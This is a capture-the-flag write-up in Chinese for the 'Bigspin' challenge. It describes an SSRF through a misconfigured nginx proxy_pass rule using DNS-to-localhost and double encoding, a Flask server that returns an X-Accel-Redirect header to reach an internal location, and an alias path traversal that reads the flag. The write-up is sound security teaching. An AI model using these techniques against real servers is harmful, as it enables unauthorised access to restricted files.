# Bigspin

- [English Version](https://balsn.tw/ctf_writeup/20190406-midnightsunctf/#bigspin)

- 題目拿到有四個連結: `/admin`, `/uberadmin`, `/user`, `/pleb`
    - `/admin`噴404
    - `/pleb`正常顯示
    - 其他噴403 
- 把`/pleb`內容拿去google，可以發現是`example.com`的內容
- Fuzzing一波可以發現`/pleb`可能背後做了某種proxy:
    - `/pleb./` => 正常
    - `/ple%62/` => 正常
    - `/pleb` => 404
    - `/pleb:` => 500
    - `/pleb../` => 502
    - `/pleba/` => 502
    - ...
- 猜測背後可能是做類似以下的Proxy rule:
    - `/pleb[INPUT]` => `example.com[INPUT]`
    - 用DNS Log測試: `/pleb.kaibro.tw`
    - 會收到`example.com.kaibro.tw`的Request，證實猜測是對的
- 接著設定`example.com.gg.kaibro.tw`指向`127.0.0.1`
    - 訪問`/pleb.gg.kaibro.tw/user/`就可以繞過限制惹
    - `/user/`底下有`nginx.c%C3%B6nf%20`
    - 用Double encoding `/pleb.gg.kaibro.tw/user/nginx.c%25C3%25B6nf%2520`可以把這個檔案讀出來:

```
worker_processes 1;
user nobody nobody;
error_log /dev/stdout;
pid /tmp/nginx.pid;
events {
  worker_connections 1024;
}

http {

    # Set an array of temp and cache files options that otherwise defaults to
    # restricted locations accessible only to root.

    client_body_temp_path /tmp/client_body;
    fastcgi_temp_path /tmp/fastcgi_temp;
    proxy_temp_path /tmp/proxy_temp;
    scgi_temp_path /tmp/scgi_temp;
    uwsgi_temp_path /tmp/uwsgi_temp;
    resolver 8.8.8.8 ipv6=off;

    server {
        listen 80;

        location / {
            root /var/www/html/public;
            try_files $uri $uri/index.html $uri/ =404;
        }

        location /user {
            allow 127.0.0.1;
            deny all;
            autoindex on;
            root /var/www/html/;
        }

        location /admin {
            internal;
            autoindex on;
            alias /var/www/html/admin/;
        }

        location /uberadmin {
            allow 0.13.3.7;
            deny all;
            autoindex on;
            alias /var/www/html/uberadmin/;
        }

        location ~ /pleb([/a-zA-Z0-9.:%]+) {
            proxy_pass   http://example.com$1;
        }

        access_log /dev/stdout;
        error_log /dev/stdout;
    }

}
```

- 可以發現`/admin`是`internal;`，所以直接訪問會噴404
- 而`uberadmin`限制IP為`0.13.3.7`，基本上也很難直接繞過
- 最後想到Nginx的`X-Accel-Redirect` header可以用來繞過`internal`
- 跑一個Server起來給`proxy_pass`送這個header，就能繞過`/admin`限制了:

```python
#!/usr/bin/env python3
from flask import Flask, current_app, request, make_response

app = Flask(__name__)

@app.route('/')
def index():
    response = make_response()
    response.headers['X-Accel-Redirect'] = '/admin/flag.txt'
    return response

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)
```

- `/admin/flag.txt`: `hmmm, should admins really get flags? seems like an uberadmin thing to me`
    - 看來必須讀`/uberadmin`
- 可以發現因為location和alias不一致(一個有結尾的`/`，一個沒有)的關係，存在Path Traversal的問題
    - `/admin../uberadmin/flag.txt`
    - `midnight{y0u_sp1n_m3_r1ght_r0und_b@by}`

